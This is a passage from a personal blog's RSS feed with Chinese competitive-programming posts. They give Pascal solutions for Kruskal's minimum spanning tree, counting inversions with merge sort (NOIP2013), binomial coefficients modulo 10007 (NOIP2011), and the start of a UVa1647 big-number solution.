class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">InitEdges</span>;</span> <span class="hljs-comment">//将邻接矩阵转化为边数组。</span></span><br><span class="line">    <span class="hljs-keyword">var</span></span><br><span class="line">        i, j: longint;</span><br><span class="line">        E: TEdge;</span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">            <span class="hljs-keyword">for</span> j := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> i-<span class="hljs-number">1</span> <span class="hljs-keyword">do</span></span><br><span class="line">            <span class="hljs-keyword">begin</span></span><br><span class="line">                E.start := i;</span><br><span class="line">                E.terminal := j;</span><br><span class="line">                E.weight := map[i, j];</span><br><span class="line">                SetLength(Edges, Length(Edges)+<span class="hljs-number">1</span>);</span><br><span class="line">                Edges[High(Edges)] := E;</span><br><span class="line">            <span class="hljs-keyword">end</span>;</span><br><span class="line">        SortEdge(Edges, Low(Edges), High(Edges));</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">//寻找自己的根节点，并把自己直接连到根结点上。</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Find</span><span class="hljs-params">(x: longint)</span>:</span> longint;</span><br><span class="line">    <span class="hljs-keyword">var</span></span><br><span class="line">        root: longint;</span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        root := x;</span><br><span class="line">        <span class="hljs-keyword">while</span> root &lt;&gt; UnionSet[root] <span class="hljs-keyword">do</span></span><br><span class="line">            root := UnionSet[root];</span><br><span class="line">        UnionSet[x] := root;</span><br><span class="line">        <span class="hljs-keyword">exit</span>(root);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">//尝试将边的两个顶点并在一个并查集中，如果两个</span></span><br><span class="line">    <span class="hljs-comment">//顶点都在同一个集合中则返回False，否则执行合</span></span><br><span class="line">    <span class="hljs-comment">//并操作。</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Union</span><span class="hljs-params">(x, y: longint)</span>:</span> boolean;</span><br><span class="line">    <span class="hljs-keyword">var</span></span><br><span class="line">        px, py: longint;</span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        px := Find(x);</span><br><span class="line">        py := Find(y);</span><br><span class="line">        <span class="hljs-keyword">if</span> px = py <span class="hljs-keyword">then</span></span><br><span class="line">            <span class="hljs-keyword">exit</span>(False);</span><br><span class="line">        UnionSet[px] := py;</span><br><span class="line">        <span class="hljs-keyword">exit</span>(True);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    Kruscal := <span class="hljs-number">0</span>;</span><br><span class="line">    fillchar(UnionSet, sizeof(UnionSet), <span class="hljs-number">0</span>);</span><br><span class="line">    InitEdges;</span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">        UnionSet[i] := i;</span><br><span class="line">    <span class="hljs-keyword">for</span> i := Low(Edges) <span class="hljs-keyword">to</span> High(Edges) <span class="hljs-keyword">do</span></span><br><span class="line">        <span class="hljs-keyword">if</span> Union(Edges[i].start, Edges[i].terminal) <span class="hljs-keyword">then</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            Kruscal := Kruscal + Edges[i].weight;</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    assign(input, <span class="hljs-string">&#x27;main.in&#x27;</span>); reset(input);</span><br><span class="line">    assign(output, <span class="hljs-string">&#x27;main.out&#x27;</span>); rewrite(output);</span><br><span class="line"></span><br><span class="line">    readln(n);</span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">        <span class="hljs-keyword">for</span> j := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">            <span class="hljs-keyword">read</span>(map[i, j]);</span><br><span class="line">    writeln(Kruscal);</span><br><span class="line"></span><br><span class="line">    close(input); close(output);</span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      <category domain="https://i.hsfzxjy.site/tags/MST/">MST</category>
      
      
      <comments>https://i.hsfzxjy.site/kruscal-and-prim/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>NOIP2013 Day1 火柴排队：快速求逆序对</title>
      <link>https://i.hsfzxjy.site/noip2013-day1-matches/</link>
      <guid>https://i.hsfzxjy.site/noip2013-day1-matches/</guid>
      <pubDate>Sat, 25 Oct 2014 19:42:23 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;题目&quot;&gt;题目&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p &gt;涵涵有两盒火柴，每盒装有 n 根火柴，每根火柴都有一个高度。现在将每盒中的火柴各自排成一列，同一列火柴的高度互不相同，两列火柴之间的距离定义为： $$&#92;sum_{i=1}^{n}{(a_i-b_i)^2}$</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="题目">题目</h2><blockquote><p >涵涵有两盒火柴，每盒装有 n 根火柴，每根火柴都有一个高度。现在将每盒中的火柴各自排成一列，同一列火柴的高度互不相同，两列火柴之间的距离定义为： $$\sum_{i=1}^{n}{(a_i-b_i)^2}$$</p><p  class="par"> 其中 ai 表示第一列火柴中第 i 个火柴的高度，bi 表示第二列火柴中第 i 个火柴的高度。</p><p  class="nomargin"> 每列火柴中相邻两根火柴的位置都可以交换，请你通过交换使得两列火柴之间的距离最小。请问得到这个最小的距离，最少需要交换多少次？如果这个数字太大，请输出这个最小交换次数对 99,999,997 取模的结果。</p></blockquote><h2 id="分析-5">分析</h2><p >这真是一道好题——断断续续想了几天才完全 AC。</p><p >事实上，由排序不等式可知：</p><p >$$当 a_i, b_i 从小到大排序时，距离最小$$</p><p  class="par"> 这是一个重要的信息。因此，我们只需把 $a_i,b_i$ 进行排序，并把对应项“捆绑”成一项，再按 $a_i$ 原有的顺序进行复原，此时，可以得到由 $b_i$ 原先的下标组成的一个序列。也就是说，我们要求 $1,2,\ldots,n$ 至少经过多少步才能变为该序列。这可以用逆序对来解决。</p><p  class="nomargin"> 只可惜，传统的逆序对算法时间复杂度为 $O(n^2)$，这里 $n$ 可达 $200000$，一定会超时 <sup id="fnref:1"><a href="#fn:1">1</a></sup>。因此我们需寻求更好的算法。</p><h2 id="用归并排序求逆序对">用归并排序求逆序对</h2><p >在归并排序的过程中，有一个步骤称为合并。在这个步骤中，需要轮流判断左右区间的第一个数的大小关系。注意到：<strong>左右区间已经有序，从而若左区间的第一个数大于右区间的第一个数，则左区间之后的所有数都大于右区间的第一个数</strong>，从而我们可以在合并时做一些修改：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">nx</span><span class="hljs-params">(l, r: longint)</span>;</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    mid, i, j, k: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> l = r <span class="hljs-keyword">then</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        tmp[l] := a[l];</span><br><span class="line">        <span class="hljs-keyword">exit</span>;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    mid := (l + r) <span class="hljs-keyword">shr</span> <span class="hljs-number">1</span>;</span><br><span class="line">    nx(l, mid);</span><br><span class="line">    nx(mid+<span class="hljs-number">1</span>, r);</span><br><span class="line">    i := l;</span><br><span class="line">    j := mid+<span class="hljs-number">1</span>;</span><br><span class="line">    k := l;</span><br><span class="line">    <span class="hljs-keyword">while</span> k &lt;= r <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (j&gt;r) <span class="hljs-keyword">or</span> (i&lt;=mid) <span class="hljs-keyword">and</span> (a[i]&lt;=a[j]) <span class="hljs-keyword">then</span> <span class="hljs-comment">//注意这里为等号</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            tmp[k] := a[i];</span><br><span class="line">            inc(i);</span><br><span class="line">        <span class="hljs-keyword">end</span></span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            cnt := cnt + mid - i + <span class="hljs-number">1</span>; <span class="hljs-comment">//加上逆序数</span></span><br><span class="line">            tmp[k] := a[j];</span><br><span class="line">            inc(j);</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">        inc(k);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> i := l <span class="hljs-keyword">to</span> r <span class="hljs-keyword">do</span></span><br><span class="line">        a[i] := tmp[i];</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br></pre></div></div><p  class="nomargin"> 这个算法复杂度为$O(n\log n)$，是一种比较理想的算法，实现起来也简单。但他有个缺点：<strong>会打乱原数组顺序</strong>。</p><h2 id="原题代码">原题代码</h2><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment">//AC</span></span><br><span class="line"><span class="hljs-keyword">const</span></span><br><span class="line">    MODN = <span class="hljs-number">99999997</span>;</span><br><span class="line"><span class="hljs-keyword">type</span></span><br><span class="line">    rec = <span class="hljs-keyword">record</span> value, <span class="hljs-keyword">index</span>: longint; <span class="hljs-keyword">end</span>;</span><br><span class="line">    TArr = <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">100000</span>] <span class="hljs-keyword">of</span> rec;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    n: longint;</span><br><span class="line">    a, b, c, tmp: TArr;</span><br><span class="line">    ok: Boolean;</span><br><span class="line">    l, r, i, j: longint;</span><br><span class="line">    cnt: int64;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">sort</span><span class="hljs-params">(<span class="hljs-keyword">var</span> arr: TArr; l, r: longint)</span>;</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    i, j: longint;</span><br><span class="line">    m, t: rec;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    i := l;</span><br><span class="line">    j := r;</span><br><span class="line">    m := arr[(i+j) <span class="hljs-keyword">shr</span> <span class="hljs-number">1</span>];</span><br><span class="line">    <span class="hljs-keyword">repeat</span></span><br><span class="line">        <span class="hljs-keyword">while</span> arr[i].value &lt; m.value <span class="hljs-keyword">do</span> inc(i);</span><br><span class="line">        <span class="hljs-keyword">while</span> arr[j].value &gt; m.value <span class="hljs-keyword">do</span> dec(j);</span><br><span class="line">        <span class="hljs-keyword">if</span> i &lt;= j <span class="hljs-keyword">then</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            t := arr[i];</span><br><span class="line">            arr[i] := arr[j];</span><br><span class="line">            arr[j] := t;</span><br><span class="line">            inc(i);</span><br><span class="line">            dec(j);</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">    <span class="hljs-keyword">until</span> i &gt;j;</span><br><span class="line">    <span class="hljs-keyword">if</span> i &lt; r <span class="hljs-keyword">then</span> sort(arr, i, r);</span><br><span class="line">    <span class="hljs-keyword">if</span> l &lt; j <span class="hljs-keyword">then</span> sort(arr, l, j);</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">nx</span><span class="hljs-params">(l, r: longint)</span>;</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    mid, i, j, k: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> l = r <span class="hljs-keyword">then</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        tmp[l] := c[l];</span><br><span class="line">        <span class="hljs-keyword">exit</span>;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    mid := (l + r) <span class="hljs-keyword">shr</span> <span class="hljs-number">1</span>;</span><br><span class="line">    nx(l, mid);</span><br><span class="line">    nx(mid+<span class="hljs-number">1</span>, r);</span><br><span class="line">    i := l;</span><br><span class="line">    j := mid+<span class="hljs-number">1</span>;</span><br><span class="line">    k := l;</span><br><span class="line">    <span class="hljs-keyword">while</span> k &lt;= r <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (j&gt;r) <span class="hljs-keyword">or</span> (i&lt;=mid) <span class="hljs-keyword">and</span> (c[i].<span class="hljs-keyword">index</span>&lt;=c[j].<span class="hljs-keyword">index</span>) <span class="hljs-keyword">then</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            tmp[k] := c[i];</span><br><span class="line">            inc(i);</span><br><span class="line">        <span class="hljs-keyword">end</span></span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            cnt := cnt + mid - i + <span class="hljs-number">1</span>;</span><br><span class="line">            cnt := cnt <span class="hljs-keyword">mod</span> MODN;</span><br><span class="line">            tmp[k] := c[j];</span><br><span class="line">            inc(j);</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">        inc(k);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> i := l <span class="hljs-keyword">to</span> r <span class="hljs-keyword">do</span></span><br><span class="line">        c[i] := tmp[i];</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    assign(input, <span class="hljs-string">&#x27;main.in&#x27;</span>); reset(input);</span><br><span class="line">    assign(output, <span class="hljs-string">&#x27;main.out&#x27;</span>); rewrite(output);</span><br><span class="line"></span><br><span class="line">    readln(n);</span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">read</span>(a[i].value);</span><br><span class="line">        a[i].<span class="hljs-keyword">index</span> := i;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">read</span>(b[i].value);</span><br><span class="line">        b[i].<span class="hljs-keyword">index</span> := i;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    sort(a, <span class="hljs-number">1</span>, n);</span><br><span class="line">    sort(b, <span class="hljs-number">1</span>, n);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">        c[a[i].<span class="hljs-keyword">index</span>] := b[i];</span><br><span class="line"></span><br><span class="line">    cnt := <span class="hljs-number">0</span>;</span><br><span class="line">    nx(<span class="hljs-number">1</span>, n);</span><br><span class="line">    writeln(cnt);</span><br><span class="line"></span><br><span class="line">    close(input); close(output);</span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div><div class="footnotes"><ol><li class="footnote" id="fn:1">事实上，只过了 70% 的点</li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Merge-Sort/">Merge Sort</category>
      
      
      <comments>https://i.hsfzxjy.site/noip2013-day1-matches/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>NOIP2011 Day2 计算系数：快速求组合数</title>
      <link>https://i.hsfzxjy.site/noip2011-day2-coefficient-calculate/</link>
      <guid>https://i.hsfzxjy.site/noip2011-day2-coefficient-calculate/</guid>
      <pubDate>Sat, 25 Oct 2014 07:27:13 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;题目大意&quot;&gt;题目大意&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 输入 $a, b, k, n, m$，计算 $a^n&#92;times b^m&#92;times C_k^n$ 模 $10007$ 的余数。&lt;/p&gt;
&lt;/blockquote</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="题目大意">题目大意</h2><blockquote><p  class="noindent"> 输入 $a, b, k, n, m$，计算 $a^n\times b^m\times C_k^n$ 模 $10007$ 的余数。</p></blockquote><h2 id="分析-4">分析</h2><p >对于幂数的计算并不难，关键在于对组合数$C_n^k$的计算。</p><p  class="nomargin"> 通常来说，组合数的计算一般是这样的：$$C_n^k=\frac{n}{k}\times\frac{n-1}{k-1}\times\ldots\times\frac{n-k+1}{1}$$ 这对于单精度的计算来说是十分快捷的，但如果要对结果取模的话就不起作用了——<strong>取模运算对于除法不成立</strong>。因此只能另辟蹊径了。</p><p  class="nomargin"> 注意到<strong>加减乘法对于取模都是成立的</strong>，从而想到：能否将组合数转化成加法？我们自然而然想到了组合恒等式：$$C_n^k=C_{n-1}^{k}+C_{n-1}^{k-1}$$ 思路到此完成。</p><h2 id="code-8">Code</h2><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">const</span></span><br><span class="line">    modn = <span class="hljs-number">10007</span>;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    a, b, k, m, n: longint;</span><br><span class="line">    map: <span class="hljs-keyword">array</span>[<span class="hljs-number">0</span>..<span class="hljs-number">1000</span>,<span class="hljs-number">0</span>..<span class="hljs-number">1000</span>] <span class="hljs-keyword">of</span> int64; <span class="hljs-comment">//缓存</span></span><br><span class="line"><span class="hljs-comment">//快速幂</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">power</span><span class="hljs-params">(a, x: longint)</span>:</span> int64;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    t: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> x = <span class="hljs-number">1</span> <span class="hljs-keyword">then</span></span><br><span class="line">        <span class="hljs-keyword">exit</span>(a);</span><br><span class="line">    <span class="hljs-keyword">if</span> x = <span class="hljs-number">0</span> <span class="hljs-keyword">then</span></span><br><span class="line">        <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);</span><br><span class="line">    t := power(a, x <span class="hljs-keyword">shr</span> <span class="hljs-number">1</span>);</span><br><span class="line">    power := t * t <span class="hljs-keyword">mod</span> modn;</span><br><span class="line">    <span class="hljs-keyword">if</span> odd(x) <span class="hljs-keyword">then</span></span><br><span class="line">        power := power * a <span class="hljs-keyword">mod</span> modn;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-comment">//快速组合数</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">C</span><span class="hljs-params">(n, k: longint)</span>:</span> int64;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> map[n, k] &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">then</span></span><br><span class="line">        <span class="hljs-keyword">exit</span>(map[n, k]);</span><br><span class="line">    <span class="hljs-keyword">if</span> (n &lt;= k) <span class="hljs-keyword">or</span> (k = <span class="hljs-number">0</span>) <span class="hljs-keyword">then</span></span><br><span class="line">        C := <span class="hljs-number">1</span></span><br><span class="line">    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> k = <span class="hljs-number">1</span> <span class="hljs-keyword">then</span></span><br><span class="line">        C := n</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">        C := (C(n-<span class="hljs-number">1</span>, k)+C(n-<span class="hljs-number">1</span>, k-<span class="hljs-number">1</span>)) <span class="hljs-keyword">mod</span> modn;</span><br><span class="line">    map[n, k] := C;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    t: longint;</span><br><span class="line">    ans: int64;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    assign(input, <span class="hljs-string">&#x27;main.in&#x27;</span>); reset(input);</span><br><span class="line">    assign(output, <span class="hljs-string">&#x27;main.out&#x27;</span>); rewrite(output);</span><br><span class="line"></span><br><span class="line">    readln(a, b, k, n, m);</span><br><span class="line">    a := a <span class="hljs-keyword">mod</span> modn;</span><br><span class="line">    b := b <span class="hljs-keyword">mod</span> modn;</span><br><span class="line">    ans := power(a, n);</span><br><span class="line">    ans := ans * power(b, m) <span class="hljs-keyword">mod</span> modn;</span><br><span class="line">    <span class="hljs-comment">//C(k,n)与C(k,m)是等效的，计算较小者即可</span></span><br><span class="line">    <span class="hljs-keyword">if</span> n &gt; m <span class="hljs-keyword">then</span> n := m;</span><br><span class="line">    ans := ans * C(k, n) <span class="hljs-keyword">mod</span> modn;</span><br><span class="line">    writeln(ans);</span><br><span class="line"></span><br><span class="line">    close(input); close(output);</span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Number-Theory/">Number Theory</category>
      
      
      <comments>https://i.hsfzxjy.site/noip2011-day2-coefficient-calculate/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>UVa1647 Computer Transformation</title>
      <link>https://i.hsfzxjy.site/uva1647-computer-transformation/</link>
      <guid>https://i.hsfzxjy.site/uva1647-computer-transformation/</guid>
      <pubDate>Fri, 24 Oct 2014 02:50:30 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 链接：&lt;a href=&quot;http://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;category=825&amp;page=show_p</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 链接：<a href="http://uva.onlinejudge.org/index.php?option=com_onlinejudge&Itemid=8&category=825&page=show_problem&problem=4522">Link</a> 耗时：0.679s</p></blockquote><h2 id="分析-3">分析</h2><p >本质上，这是一道求数列通项的题目。我们列出前几个字符串：$$01,$$$$1001,$$$$01101001,$$$$1001011001101001,$$$$\ldots$$</p><p  class="par"> 如果用$S_i$表示第 i 个字符串中“00”的个数，则有：$$S_1=0,\ S_2=1,\ S_3=1,\ S_4=3,\ S_5=5,\ S_6=11,\ldots$$</p><p  class="par"> 经过观察可以发现有如下规律：$$S_n=2\times S_{n-1}+{(-1)}^n$$</p><p  class="par"> 求通项就简单了，换个元即可：$$S_n=\frac{1}{3}[{(-1)}^n+2^{n-1}]$$</p><p >程序采用高精度实现。</p><h2 id="code-7">Code</h2><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">const</span></span><br><span class="line">    JINDU = <span class="hljs-number">100000</span>;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    n: Integer;</span><br><span class="line"><span class="hljs-comment">//在数字前补0</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">PrintANumber</span><span class="hljs-params">(x: longint)</span>;</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    t: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> x = <span class="hljs-number">0</span> <span class="hljs-keyword">then</span></span><br><span class="line">        <span class="hljs-keyword">write</span>(<span class="hljs-string">&#x27;00000&#x27;</span>)</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        t := JINDU;</span><br><span class="line">        <span class="hljs-keyword">while</span> t &gt; x * <span class="hljs-number">10</span> <span class="hljs-keyword">do</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            <span class="hljs-keyword">write</span>(<span class="hljs-number">0</span>);</span><br><span class="line">            t := t <span class="hljs-keyword">div</span> <span class="hljs-number">10</span>;</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">        <span class="hljs-keyword">write</span>(x);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    ans: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">300</span>] <span class="hljs-keyword">of</span> longint;</span><br><span class="line">    len, i: integer;</span><br><span class="line"><span class="hljs-comment">//计算2^(n-1)</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">calc2</span>;</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    i, x, t, mul: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    len := <span class="hljs-number">1</span>;</span><br><span class="line">    ans[<span class="hljs-number">1</span>] := <span class="hljs-number">1</span>;</span><br><span class="line">    t := n-<span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> t &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-keyword">if</span> t &lt; <span class="hljs-number">6</span> <span class="hljs-keyword">then</span></span><br><span class="line">            mul := <span class="hljs-number">1</span> &lt;&lt; t</span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line">            mul := <span class="hljs-number">64</span>;</span><br><span class="line">        x := <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> len <span class="hljs-keyword">do</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            ans[i] := ans[i] * mul + x;</span><br><span class="line">            x := ans[i] <span class="hljs-keyword">div</span> JINDU;</span><br><span class="line">            ans[i] := ans[i] <span class="hljs-keyword">mod</span> JINDU;</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">then</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            inc(len);</span><br><span class="line">            ans[len] := x;</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">        dec(t, <span class="hljs-number">6</span>);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-comment">//除以3</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">div3</span>;</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    i, x, t: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    i := len;</span><br><span class="line">    x := <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> i &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        t := (x * JINDU + ans[i]);</span><br><span class="line">        ans[i] := t <span class="hljs-keyword">div</span> <span class="hljs-number">3</span>;</span><br><span class="line">        x := t <span class="hljs-keyword">mod</span> <span class="hljs-number">3</span>;</span><br><span class="line">        dec(i);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> ans[len] = <span class="hljs-number">0</span> <span class="hljs-keyword">do</span> dec(len);</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    assign(input, <span class="hljs-string">&#x27;main.in&#x27;</span>); reset(input);</span><br><span class="line">    assign(output, <span class="hljs-string">&#x27;main.out&#x27;</span>); rewrite(output);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> eof <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        readln(n);</span><br><span class="line">        <span class="hljs-keyword">if</span> n=<span class="hljs-number">1</span> <span class="hljs-keyword">then</span>   <span class="hljs-comment">//特殊情况处理</span></span><br><span class="line">        <span 